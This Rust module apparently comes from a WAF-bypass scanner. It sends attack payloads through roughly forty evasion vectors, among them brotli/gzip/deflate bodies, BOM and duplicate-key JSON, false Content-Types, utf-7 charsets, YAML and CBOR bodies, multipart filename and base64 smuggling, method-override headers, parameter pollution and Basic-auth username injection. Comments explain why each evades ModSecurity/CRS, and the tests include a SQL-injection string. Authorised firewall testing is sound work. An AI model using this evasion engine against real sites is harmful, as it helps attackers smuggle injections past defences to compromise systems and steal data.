//! Multi-vector probing — fire each top-confidence bypass payload
//! through every alternative delivery vector to find a richer
//! bypass set.
//!
//! ## Why this exists separately
//!
//! `scan/mod.rs` orchestrates a multi-phase pipeline; multi-vector
//! is just one phase. Keeping it inline grew the god file by 400
//! lines and made every new vector a touch on `scan/mod.rs`. This
//! module is the natural extraction point so a new delivery vector
//! is ONE row in `VECTORS` + ONE arm in `build_request_for_vector`
//! — a five-minute job, no scan-engine reading required.
//!
//! ## Vector axes
//!
//! Each vector tags the same payload bytes onto a different part
//! of the HTTP request so a WAF that perfectly inspects one
//! surface might miss another. Three independent axes:
//!
//! 1. **Compression-confusion** (`POST-form-br`, `POST-json-br`,
//!    `POST-form-gz`, `POST-json-gz`) — wrap the body in
//!    `Content-Encoding: br` or `gzip`. Brotli is the headline gap
//!    (most WAFs lack a brotli decompressor in the inspection
//!    pipeline). Gzip is the control — most WAFs DO decode gzip,
//!    so a gzip-only bypass is a separate (gzip-handling) bug.
//!
//! 2. **JSON parser-disagreement** (`POST-json-bom`,
//!    `POST-json-dupkey`, `POST-json-array`) — exploit body-
//!    processor edge cases. BOM-prefixed JSON: ModSec's processor
//!    rejects on BOM and skips body inspection while the origin
//!    parses fine. Duplicate keys: WAF takes first occurrence,
//!    most backends take last. Array root: rule-set wrote ARGS
//!    expecting object-root.
//!
//! 3. **Content-Type lying** (`POST-json-as-plain`,
//!    `POST-form-as-octet`) — declare a non-`application/json` /
//!    `application/x-www-form-urlencoded` Content-Type so the WAF
//!    skips body parsing. Lenient backends auto-detect or accept
//!    raw bodies anyway.
//!
//! 4. **Header / parameter shuffling** (`cookie`, `hpp`,
//!    `x-forwarded-for`, `referer`) — pre-existing vectors kept
//!    for completeness. WAFs sometimes weight header inspection
//!    lower than ARGS inspection.

use std::time::Duration;

use colored::Colorize;
use reqwest::Client;
use tokio_util::sync::CancellationToken;
use wafrift_encoding::compression::{self, Algorithm as CompressionAlgo, chain as compress_chain};
use wafrift_transport::is_waf_block;

/// A single (vector_name, default_content_type) row in the
/// catalogue. The `name` is the dispatch key for
/// [`build_request_for_vector`]; the `content_type` is what the
/// builder usually sets (compression variants override it).
#[derive(Debug, Clone, Copy)]
pub struct Vector {
    pub name: &'static str,
    pub content_type: &'static str,
}

/// Catalogue. Vector ordering is meaningful — vectors that hit
/// rare WAF surfaces (BOM JSON, brotli body) come AFTER the
/// baseline form / JSON ones so the operator's text-mode output
/// has the natural-shape vectors at the top of the table.
pub const VECTORS: &[Vector] = &[
    Vector { name: "POST-form", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json", content_type: "application/json" },
    Vector { name: "POST-xml", content_type: "application/xml" },
    Vector { name: "POST-multipart", content_type: "multipart/form-data" },
    Vector { name: "POST-form-br", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json-br", content_type: "application/json" },
    Vector { name: "POST-form-gz", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json-gz", content_type: "application/json" },
    // Chained Content-Encoding (gzip then brotli) — WAFs that
    // decode ONE compression layer give up at the second, leaving
    // an opaque blob. Origins decode both per RFC 9110 §8.4.
    Vector { name: "POST-json-gz-br", content_type: "application/json" },
    Vector { name: "POST-form-gz-br", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-json-bom", content_type: "application/json" },
    Vector { name: "POST-json-dupkey", content_type: "application/json" },
    Vector { name: "POST-json-array", content_type: "application/json" },
    Vector { name: "POST-json-as-plain", content_type: "text/plain" },
    Vector { name: "POST-form-as-octet", content_type: "application/octet-stream" },
    // HTTP method-override header — POST with
    // `X-HTTP-Method-Override: GET`. Spring's HiddenHttpMethodFilter,
    // Express's method-override middleware, Rails's
    // ActionController::MethodOverride, Symfony's
    // HttpMethodParameterOverride all route on the OVERRIDE header
    // when present. WAF rule-sets that match by HTTP method (e.g.
    // "this rule fires on POST only, GET is allowed-list") miss
    // the request entirely.
    Vector { name: "POST-method-override-GET", content_type: "application/x-www-form-urlencoded" },
    Vector { name: "POST-method-override-PUT", content_type: "application/x-www-form-urlencoded" },
    // charset=utf-7 — WAFs route JSON parsing by charset; many
    // refuse utf-7 + fall through to no body inspection. Modern
    // backends (Python json, jsoniter, Go encoding/json) accept
    // any charset that decodes to valid UTF-8 octets.
    Vector { name: "POST-json-utf7", content_type: "application/json; charset=utf-7" },
    // Symmetry vector — same charset trick on form bodies. WAFs
    // that handled utf-7 JSON may NOT have plumbed the same gate
    // through form-body inspection. Backends still decode form
    // bytes as utf-8 regardless of the charset hint.
    Vector { name: "POST-form-utf7", content_type: "application/x-www-form-urlencoded; charset=utf-7" },
    // Raw deflate / RFC 1951 — ModSecurity's SecGzipDecompression
    // directive handles gzip only. `Content-Encoding: deflate`
    // bodies opaque to the inspection pipeline; origins handle
    // deflate via their HTTP stack (nginx, Apache, IIS, hyper).
    // The encoding crate's own doc-comment flags deflate as
    // "irregular WAF support" — exploit it.
    Vector { name: "POST-json-deflate", content_type: "application/json" },
    Vector { name: "POST-form-deflate", content_type: "application/x-www-form-urlencoded" },
    // YAML body — CRS has json/xml processors, NO yaml processor.
    // Payload lives in the YAML scalar value position. Spring's
    // YamlPropertySourceFactory, Rails's safe-load YAML, Express
    // yaml middleware all parse `application/yaml` request bodies;
    // ModSec's inspection layer treats them as opaque bytes.
    Vector { name: "POST-yaml", content_type: "application/yaml" },
    // Multipart with `Content-Transfer-Encoding: base64` on the
    // attack part. WAFs that inspect multipart bodies see only the
    // base64-encoded blob; MIME-compliant backends (multer, Spring
    // MultipartResolver, ASP.NET, Python multipart) decode CTE
    // automatically per RFC 2045 §6.8.
    Vector { name: "POST-multipart-b64", content_type: "multipart/form-data" },
    // Duplicate-boundary multipart — two boundary strings, WAF
    // tracks one, origin tracks the other; the attack part is
    // visible only to the "wrong" one.
    Vector { name: "POST-multipart-dupbound", content_type: "multipart/form-data" },
    // Direct PUT / PATCH wire methods. Differs from
    // POST-method-override-* in that the request line itself
    // carries the alt method, not just a header. WAF rule paths
    // that match on REQUEST_METHOD for "this rule fires on POST"
    // miss the request entirely; backends with full REST routing
    // (Spring, Rails, Express, Django REST) process PUT/PATCH
    // bodies identically to POST.
    Vector { name: "PUT-json", content_type: "application/json" },
    Vector { name: "PATCH-json", content_type: "application/json" },
    Vector { name: "PUT-form", content_type: "application/x-www-form-urlencoded" },
    // Semicolon-as-HPP-separator. Tomcat/Jetty/old Java
    // containers treat `;` as a query-param separator equal to
    // `&`; ModSec splits on `&` only. `q=harmless;q=attack` is
    // ONE param ("harmless;q=attack") to the WAF, TWO params to
    // the backend (last-occurrence-wins gives the attack).
    Vector { name: "hpp-semicolon", content_type: "" },
    // application/cbor — RFC 8949 binary serialization. Zero WAF
    // body-processor support; every modern API stack (Rust ciborium,
    // JS cbor-x, Python cbor2, Java jackson-cbor) decodes it
    // server-side. We emit a minimal `{param: payload}` map.
    Vector { name: "POST-cbor", content_type: "application/cbor" },
    // text/xml — CRS xml-body rules anchor on `application/xml`
    // ONLY in many profiles; `text/xml` is an RFC-7303-permitted
    // alternate MIME most XML parsers (libxml2, Xerces, JAXB,
    // dotnet System.Xml) accept identically. WAF declines body
    // inspection; backend parses XML normally.
    Vector { name: "POST-text-xml", content_type: "text/xml" },
    // Multipart with payload in the `filename=` parameter, NOT
    // the part body. CRS multipart rules inspect FIELD VALUES;
    // `filename` is the attachment metadata. Backends that read
    // `multipart.parts[i].filename` and pass it to a downstream
    // sink (logger, search index, NoSQL store) flow the attack
    // payload through. Especially potent for SQLi-in-filename and
    // path-traversal-in-filename rule sets.
    Vector { name: "POST-multipart-filename", content_type: "multipart/form-data" },
    // Authorization: Basic carrying payload-in-username. Wafrift
    // sends `Basic base64(<payload>:dummy)`. WAFs trust the
    // Authorization header for routing / rate-limiting and skip
    // body-shape ARGS inspection on its contents. Backends that
    // log the decoded username (audit trails, login attempt
    // metrics, custom auth middleware) flow it into SQL / log /
    // template sinks.
    Vector { name: "authorization-basic", content_type: "" },
    Vector { name: "cookie", content_type: "" },
    Vector { name: "hpp", content_type: "" },
    Vector { name: "x-forwarded-for", content_type: "" },
    Vector { name: "referer", content_type: "" },
];

/// The phase's I/O surface — keeps callers from having to know the
/// full ScanArgs shape and keeps the inputs to this module
/// minimal. `top_payloads` is the operator's top-confidence set
/// from the equivalence-class phase, already deduped.
pub struct PhaseInput<'a> {
    pub http: &'a Client,
    pub target: &'a str,
    pub param: &'a str,
    pub top_payloads: &'a [(String, Vec<String>)],
    /// Payloads that were BLOCKED in earlier phases — fire them
    /// through every alt vector as rescue attempts. A bypass on
    /// any vector means the payload itself was viable; only the
    /// delivery shape was getting caught. Each rescue success
    /// surfaces with a `vector::<name>::rescue` technique tag so
    /// the operator can distinguish it from a confirm-bypass on
    /// the same vector.
    pub rescue_payloads: &'a [(String, Vec<String>)],
    pub cancel: &'a CancellationToken,
    pub scan_text: bool,
    pub delay: Duration,
    /// Starting counter for `vector::<name>` techniques so
    /// downstream telemetry stays monotone across phases.
    pub variant_id_base: usize,
}

/// What this phase produces. Counters are DELTAS — the caller
/// merges them into its running totals.
#[derive(Debug, Default)]
pub struct PhaseOutcome {
    pub total_fired_delta: usize,
    pub bypassed_delta: u32,
    pub blocked_delta: u32,
    pub errors_delta: u32,
    /// New bypass variants discovered this phase, in the same
    /// (id, payload, techs, confidence) shape `scan/mod.rs` uses.
    pub new_bypass_variants: Vec<(usize, String, Vec<String>, f64)>,
    /// (technique_tags, blocked) outcomes for every fire this
    /// phase — feeds the post-scan gene-bank merge.
    pub new_variant_outcomes: Vec<(Vec<String>, bool)>,
    /// Per-vector tallies for the text-mode summary table.
    pub vector_results: Vec<(String, u32, u32)>,
}

/// Hand-rolled CBOR (RFC 8949) encoder for a single
/// text-string-to-text-string map: `{key: value}`. Output format
/// per the spec:
///
/// - `0xA1` — map(1)
/// - key text string header (major type 3) + key UTF-8 bytes
/// - value text string header (major type 3) + value UTF-8 bytes
///
/// Text-string header is `0x60 | n` for n ≤ 23, `0x78 LL` for
/// n ≤ 255, `0x79 LL LL` (big-endian) for n ≤ 65535, etc. We
/// stop at 16-bit length — WAF-evasion payloads never exceed that.
/// Anything bigger falls back to the 16-bit length encoding with
/// the high bytes set to the actual length (still RFC 8949-legal
/// up to the u16 ceiling). Strings longer than 65535 bytes are a
/// non-goal here.
fn encode_cbor_text_string(s: &str, out: &mut Vec<u8>) {
    let bytes = s.as_bytes();
    let n = bytes.len();
    if n <= 23 {
        out.push(0x60 | (n as u8));
    } else if n <= 0xFF {
        out.push(0x78);
        out.push(n as u8);
    } else {
        // 16-bit length covers up to 64 KiB which is far more
        // than any payload wafrift ever fires.
        let n16 = n.min(0xFFFF) as u16;
        out.push(0x79);
        out.extend_from_slice(&n16.to_be_bytes());
    }
    out.extend_from_slice(bytes);
}

/// Public encoder for the `POST-cbor` vector: produces a
/// CBOR-encoded `{key: value}` map. Held as a function so it can
/// be unit-tested directly without standing up an HTTP request.
fn encode_cbor_string_map(key: &str, value: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(2 + key.len() + value.len() + 8);
    out.push(0xA1); // map(1)
    encode_cbor_text_string(key, &mut out);
    encode_cbor_text_string(value, &mut out);
    out
}

/// XML-entity-escape the bytes that go into an XML text node.
/// Only the five XML-significant chars need handling — every
/// other byte is fine in a text node per W3C XML 1.0 §2.4. The
/// backend's XML parser un-escapes them, so the payload arrives
/// byte-identical to what we'd have sent as a plain string in any
/// other delivery shape.
fn xml_text_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for ch in s.chars() {
        match ch {
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '&' => out.push_str("&amp;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&apos;"),
            other => out.push(other),
        }
    }
    out
}

/// Build the reqwest::RequestBuilder for `vector` against the
/// target with `payload`. Returns `None` when the vector chooses
/// to skip this fire (e.g. a transient compression failure —
/// caller logs and moves on). Centralising the per-vector wire
/// shape here is the dedup win: scan/mod.rs no longer carries a
/// 400-line match.
fn build_request_for_vector(
    vector: &Vector,
    http: &Client,
    target: &str,
    param: &str,
    payload: &str,
    fire_counter: usize,
) -> Option<reqwest::RequestBuilder> {
    let ct = vector.content_type;
    match vector.name {
        "POST-form" => {
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json" => {
            let body = serde_json::json!({ param: payload }).to_string();
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-xml" => {
            // XML body inspection is the most weakly-covered axis
            // at CRS PL1: no `application/xml` parser fans out into
            // ARGS_NAMES / ARGS the way `application/json` does
            // with `tx.json_request_body_processor`. ARGS-scoped
            // rules miss the payload entirely. Transparent to any
            // backend that parses XML (SOAP, RSS, content-negotiating
            // endpoints) and sinks the inner text node. Payload is
            // XML-entity-escaped so `<` / `>` / `&` / `"` ride the
            // wire safely; the backend's parser un-escapes them.
            let escaped = xml_text_escape(payload);
            let body = format!(
                "<?xml version=\"1.0\"?><request><{name}>{escaped}</{name}></request>",
                name = param,
            );
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-multipart" => {
            let boundary = format!("----WafRiftBoundary{fire_counter:x}");
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\n\r\n{payload}\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }
        "POST-form-br" | "POST-form-gz" | "POST-form-deflate" => {
            let algo = match vector.name {
                "POST-form-br" => CompressionAlgo::Brotli,
                "POST-form-gz" => CompressionAlgo::Gzip,
                _ => CompressionAlgo::Deflate,
            };
            let raw = format!("{param}={}", urlencoding::encode(payload));
            match compression::compress(raw.as_bytes(), algo) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compression {algo:?} skipped: {e}");
                    None
                }
            }
        }
        "POST-json-br" | "POST-json-gz" | "POST-json-deflate" => {
            let algo = match vector.name {
                "POST-json-br" => CompressionAlgo::Brotli,
                "POST-json-gz" => CompressionAlgo::Gzip,
                _ => CompressionAlgo::Deflate,
            };
            let raw = serde_json::json!({ param: payload }).to_string();
            match compression::compress(raw.as_bytes(), algo) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compression {algo:?} skipped: {e}");
                    None
                }
            }
        }
        "POST-json-gz-br" | "POST-form-gz-br" => {
            let raw = if vector.name == "POST-json-gz-br" {
                serde_json::json!({ param: payload }).to_string()
            } else {
                format!("{param}={}", urlencoding::encode(payload))
            };
            // Chain: outer = gzip, inner = brotli — body is
            // gzip(brotli(payload)). WAFs that decode gzip then
            // stop see a brotli blob; WAFs without brotli see the
            // gzip blob; origins per RFC 9110 §8.4 decode both
            // outer-to-inner.
            match compress_chain(
                raw.as_bytes(),
                &[CompressionAlgo::Gzip, CompressionAlgo::Brotli],
            ) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] gzip,br chain skipped: {e}");
                    None
                }
            }
        }
        "POST-json-utf7" => {
            // charset=utf-7 header → WAFs that route JSON parsing
            // by declared charset refuse the body / fall through
            // to no inspection. The body itself stays UTF-8;
            // modern backends ignore the charset hint and just
            // parse the bytes (Python json, jsoniter, Go's
            // encoding/json, Java Jackson all accept).
            let raw = serde_json::json!({ param: payload }).to_string();
            Some(http.post(target).header("Content-Type", ct).body(raw))
        }
        "POST-form-utf7" => {
            // Same charset-routing gap on the form-body axis.
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-yaml" => {
            // YAML 1.2 §7.3.2 double-quoted scalars share JSON
            // string escaping — `serde_json::Value::String(p).to_string()`
            // emits exactly that surface. Backends parsing
            // `application/yaml` (YAML 1.1+, all major libs)
            // recover the payload byte-identical; WAFs without a
            // YAML body processor see opaque bytes.
            let escaped = serde_json::Value::String(payload.to_string()).to_string();
            let body = format!("{param}: {escaped}\n");
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-multipart-b64" => {
            // Part-level `Content-Transfer-Encoding: base64` per
            // RFC 2045 §6.8 — backend MIME parsers decode the
            // base64 payload back into the field value; WAFs
            // inspecting raw multipart bytes see only the encoded
            // blob.
            use base64::Engine as _;
            let boundary = format!("----WafRiftB64Boundary{fire_counter:x}");
            let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\nContent-Transfer-Encoding: base64\r\n\r\n{encoded}\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }
        "PUT-json" | "PATCH-json" => {
            let body = serde_json::json!({ param: payload }).to_string();
            let req = if vector.name == "PUT-json" {
                http.put(target)
            } else {
                http.patch(target)
            };
            Some(req.header("Content-Type", ct).body(body))
        }
        "PUT-form" => {
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(http.put(target).header("Content-Type", ct).body(body))
        }
        "hpp-semicolon" => {
            // Tomcat/Jetty parse `;` as a query-param separator;
            // ModSec splits ARGS on `&` only. The benign value
            // comes first so first-occurrence parsers (including
            // any WAF that DOES split on `;`) see only the harmless
            // value; last-occurrence backends (most) see the attack.
            let url = format!(
                "{target}?{param}=harmless;{param}={}",
                urlencoding::encode(payload)
            );
            Some(http.get(url))
        }
        "POST-cbor" => {
            // Minimal CBOR (RFC 8949): {param: payload} as a
            // single-entry text-string-to-text-string map. We
            // hand-encode rather than pulling a CBOR crate — the
            // shape is small and stable, and a dependency would
            // be pure overhead for one builder.
            let body = encode_cbor_string_map(param, payload);
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-text-xml" => {
            // Identical XML body shape to POST-xml; only the
            // declared Content-Type differs. text/xml vs
            // application/xml is the routing crack we're exploiting.
            let escaped = xml_text_escape(payload);
            let body = format!(
                "<?xml version=\"1.0\"?><request><{name}>{escaped}</{name}></request>",
                name = param,
            );
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-multipart-filename" => {
            // Payload rides in `filename=<...>`; the part body is
            // a benign 1-byte placeholder so a backend that reads
            // value-only sees nothing interesting. Backends that
            // log `filename` (audit, search, NoSQL keying) flow
            // the payload into a downstream sink.
            let boundary = format!("----WafRiftFnBoundary{fire_counter:x}");
            // Filename values per RFC 7578 are quoted-string; we
            // backslash-escape any `"` to keep the multipart parse
            // valid. Any other byte rides verbatim.
            let filename = payload.replace('\\', "\\\\").replace('"', "\\\"");
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"; filename=\"{filename}\"\r\n\r\nx\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }
        "authorization-basic" => {
            // Basic auth header: `Authorization: Basic base64(user:pass)`.
            // We hide the payload in the USERNAME half. WAFs that
            // inspect Authorization usually only check for absence
            // /  presence (rate-limit / brute-force counting), not
            // the decoded contents.
            use base64::Engine as _;
            let basic = format!("{payload}:wafrift-probe");
            let encoded = base64::engine::general_purpose::STANDARD.encode(basic.as_bytes());
            let url = crate::scan::scan_url_with_param(
                target,
                param,
                &urlencoding::encode(payload),
            );
            Some(
                http.get(&url)
                    .header("Authorization", format!("Basic {encoded}")),
            )
        }
        "POST-multipart-dupbound" => {
            // Two boundary strings declared (header lists one;
            // body uses both). WAFs that re-parse the boundary
            // from the body see one split, origins per RFC 7578
            // honour ONLY the header-declared boundary.
            let header_boundary = format!("----WafRiftA{fire_counter:x}");
            let body_boundary = format!("----WafRiftB{fire_counter:x}");
            let body = format!(
                "--{header_boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\n\r\n{payload}\r\n\
                 --{body_boundary}\r\nContent-Disposition: form-data; name=\"decoy\"\r\n\r\nharmless\r\n\
                 --{header_boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={header_boundary}"),
                    )
                    .body(body),
            )
        }
        "POST-json-bom" => {
            // UTF-8 BOM (EF BB BF) prefix on a JSON body. ModSec's
            // JSON body processor refuses on BOM and falls through
            // to "no JSON inspection" — payload escapes ARGS rules.
            let raw = serde_json::json!({ param: payload }).to_string();
            let mut body = Vec::with_capacity(3 + raw.len());
            body.extend_from_slice(&[0xEF, 0xBB, 0xBF]);
            body.extend_from_slice(raw.as_bytes());
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-dupkey" => {
            // Benign value FIRST, attack LAST. WAFs that scan only
            // the first occurrence miss the attack; most JSON libs
            // (Python, Java Jackson default, Go encoding/json,
            // serde_json with default settings) take the last.
            let body = format!(
                "{{\"{p}\":\"x\",\"{p}\":{v}}}",
                p = param,
                v = serde_json::Value::String(payload.to_string())
            );
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-array" => {
            let body = serde_json::json!([{ param: payload }]).to_string();
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-as-plain" => {
            // Content-Type lying — declare JSON body as text/plain.
            // WAFs skip JSON inspection; lenient backends still
            // parse the body as JSON.
            let raw = serde_json::json!({ param: payload }).to_string();
            Some(http.post(target).header("Content-Type", ct).body(raw))
        }
        "POST-method-override-GET" | "POST-method-override-PUT" => {
            // Wire shape: standard POST with form body, plus
            // X-HTTP-Method-Override pointing at the masquerade
            // method. A backend that honours the override routes
            // the request to its GET / PUT handler; a WAF that
            // gates by request-line method continues to apply its
            // POST rule-set (often weaker on these methods than on
            // POST).
            let masquerade = if vector.name.ends_with("GET") { "GET" } else { "PUT" };
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(
                http.post(target)
                    .header("Content-Type", ct)
                    .header("X-HTTP-Method-Override", masquerade)
                    .body(body),
            )
        }
        "POST-form-as-octet" => {
            // Content-Type lying for forms — declare form body as
            // octet-stream. WAFs don't run form processing on
            // octet-stream; lenient backends still parse it.
            let body = format!("{param}={}", urlencoding::encode(payload));
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "cookie" => Some(
            http.get(target)
                .header("Cookie", format!("{param}={}", urlencoding::encode(payload))),
        ),
        "hpp" => {
            let url = format!(
                "{target}?{param}=harmless&{param}={}",
                urlencoding::encode(payload)
            );
            Some(http.get(url))
        }
        "x-forwarded-for" => {
            let url = crate::scan::scan_url_with_param(
                target,
                param,
                &urlencoding::encode(payload),
            );
            Some(http.get(&url).header("X-Forwarded-For", payload))
        }
        "referer" => {
            let url = crate::scan::scan_url_with_param(
                target,
                param,
                &urlencoding::encode(payload),
            );
            Some(
                http.get(&url)
                    .header("Referer", format!("https://example.com/?{payload}")),
            )
        }
        _ => None,
    }
}

/// Run the multi-vector phase. Returns a [`PhaseOutcome`] the
/// caller merges into its running totals. Cancellable via the
/// CancellationToken — the loop exits cleanly between fires.
///
/// Two payload sets get fired through every vector:
/// 1. `top_payloads` — already-bypassed at earlier phases. A
///    bypass here confirms the new delivery shape ALSO works for
///    the same payload (broadens the bypass set).
/// 2. `rescue_payloads` — top blocked from earlier phases. A
///    bypass here means the payload itself was viable; only the
///    earlier delivery shape was getting caught. Recovered ones
///    are tagged with `vector::<name>::rescue` so the operator
///    can audit "what was blocked, what got rescued".
pub async fn run_phase(input: PhaseInput<'_>) -> PhaseOutcome {
    let mut outcome = PhaseOutcome::default();

    let total_inputs = input.top_payloads.len() + input.rescue_payloads.len();
    if input.scan_text {
        println!(
            "\n{}",
            format!(
                "[5/7] Multi-vector probing — {} payloads ({} bypass + {} rescue) × {} vectors...",
                total_inputs,
                input.top_payloads.len(),
                input.rescue_payloads.len(),
                VECTORS.len()
            )
            .bold()
            .magenta()
        );
    }

    // Joined input — same vectors fire against both pools. We tag
    // the technique differently so the operator can tell rescue
    // wins apart from confirm wins.
    let combined: Vec<(&(String, Vec<String>), bool)> = input
        .top_payloads
        .iter()
        .map(|p| (p, false))
        .chain(input.rescue_payloads.iter().map(|p| (p, true)))
        .collect();

    for vector in VECTORS {
        if input.cancel.is_cancelled() {
            break;
        }
        let mut v_bypassed: u32 = 0;
        let mut v_blocked: u32 = 0;

        for ((payload, techs), is_rescue) in &combined {
            if input.cancel.is_cancelled() {
                break;
            }
            let fire_counter = input.variant_id_base + outcome.total_fired_delta;
            let Some(builder) = build_request_for_vector(
                vector,
                input.http,
                input.target,
                input.param,
                payload,
                fire_counter,
            ) else {
                continue;
            };
            let result = builder.send().await;
            let is_blocked = match result {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    // Bounded read — hostile target could ship a
                    // gzip-bomb response that OOMs the scanner.
                    let body = crate::safe_body::read_bounded(
                        resp,
                        crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES,
                    )
                    .await
                    .unwrap_or_default();
                    is_waf_block(status, &body)
                }
                Err(_) => {
                    outcome.errors_delta += 1;
                    continue;
                }
            };
            outcome.total_fired_delta += 1;
            let mut vtechs = techs.clone();
            let tag = if *is_rescue {
                format!("vector::{}::rescue", vector.name)
            } else {
                format!("vector::{}", vector.name)
            };
            vtechs.push(tag);
            outcome.new_variant_outcomes.push((vtechs.clone(), is_blocked));

            if is_blocked {
                outcome.blocked_delta += 1;
                v_blocked += 1;
                if input.scan_text {
                    print!("{}", ".".bright_black());
                }
            } else {
                outcome.bypassed_delta += 1;
                v_bypassed += 1;
                outcome.new_bypass_variants.push((
                    input.variant_id_base + outcome.total_fired_delta,
                    (*payload).clone(),
                    vtechs,
                    if *is_rescue { 0.85 } else { 0.95 },
                ));
                if input.scan_text {
                    let marker = if *is_rescue { "R" } else { "!" };
                    print!("{}", marker.bright_green().bold());
                }
            }

            if !input.delay.is_zero() {
                tokio::time::sleep(input.delay).await;
            }
        }

        outcome
            .vector_results
            .push((vector.name.to_string(), v_bypassed, v_blocked));
    }

    if input.scan_text {
        for (name, vb, vbl) in &outcome.vector_results {
            let total = vb + vbl;
            let rate = if total > 0 {
                f64::from(*vb) / f64::from(total) * 100.0
            } else {
                0.0
            };
            let status = if *vb > 0 {
                format!("{vb}/{total} bypassed ({rate:.0}%)")
                    .green()
                    .to_string()
            } else {
                format!("0/{total} — fully blocked")
                    .bright_black()
                    .to_string()
            };
            println!("  {} {}: {}", "→".bright_magenta(), name.yellow(), status);
        }
    }

    outcome
}

#[cfg(test)]
mod tests {
    use super::*;

    fn http() -> Client {
        Client::builder().build().expect("client")
    }

    #[test]
    fn vector_catalogue_is_unique_by_name() {
        // Anti-rig: a duplicate vector name would silently fire
        // the SAME builder twice and bias the table.
        let mut seen = std::collections::HashSet::new();
        for v in VECTORS {
            assert!(seen.insert(v.name), "duplicate vector name: {}", v.name);
        }
    }

    #[test]
    fn vector_catalogue_covers_all_three_axes() {
        // The compression / JSON-confusion / CT-lying axes must
        // each contribute at least one vector. A refactor that
        // accidentally dropped an axis would silently weaken the
        // engine.
        let names: std::collections::HashSet<&str> =
            VECTORS.iter().map(|v| v.name).collect();
        assert!(names.contains("POST-form-br"), "missing brotli vector");
        assert!(names.contains("POST-json-bom"), "missing BOM vector");
        assert!(names.contains("POST-json-as-plain"), "missing CT-lying vector");
        assert!(names.contains("hpp"), "missing param-pollution vector");
    }

    #[test]
    fn build_post_form_emits_url_encoded_body() {
        let h = http();
        let builder = build_request_for_vector(
            &VECTORS[0],
            &h,
            "http://example.com/get",
            "q",
            "' OR 1=1--",
            0,
        )
        .expect("post-form builds");
        let req = builder.build().expect("build");
        assert_eq!(req.method(), "POST");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("q="));
        assert!(s.contains("%20") || s.contains("+") || s.contains("%27"));
    }

    #[test]
    fn build_post_json_emits_serde_json_body() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let v: serde_json::Value = serde_json::from_str(s).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_post_json_bom_prefixes_utf8_bom_bytes() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-bom").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(&body[..3], &[0xEF, 0xBB, 0xBF], "must lead with UTF-8 BOM");
        let json_part = std::str::from_utf8(&body[3..]).unwrap();
        let v: serde_json::Value = serde_json::from_str(json_part).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_post_json_dupkey_emits_two_q_keys() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-dupkey").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
